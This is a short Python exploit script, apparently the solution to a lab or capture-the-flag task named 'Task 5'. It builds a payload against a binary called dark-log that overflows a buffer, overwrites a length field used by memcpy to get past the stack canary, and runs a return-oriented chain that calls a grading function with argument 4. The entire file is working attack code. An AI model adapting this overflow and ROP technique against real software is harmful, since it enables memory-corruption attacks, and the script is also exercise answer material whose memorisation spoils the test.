#!/usr/bin/env python3
"""Task 5: bypass the stack canary in dark-log via f.len and memcpy."""
import struct
import sys
POP_RDI_RET = 0x4018A3
RET = 0x4018A4
GRADE_EVAL = 0x401677
chain = (
    struct.pack("<Q", POP_RDI_RET)
    + struct.pack("<Q", 4)
    + struct.pack("<Q", RET)
    + struct.pack("<Q", GRADE_EVAL)
)
source = chain + b"A" * (128 - len(chain))
filler = b"B" * 128
length = struct.pack("<I", 0xA8)

payload = source + filler + length
assert len(payload) == 260
assert b"\n" not in payload
sys.stdout.buffer.write(payload)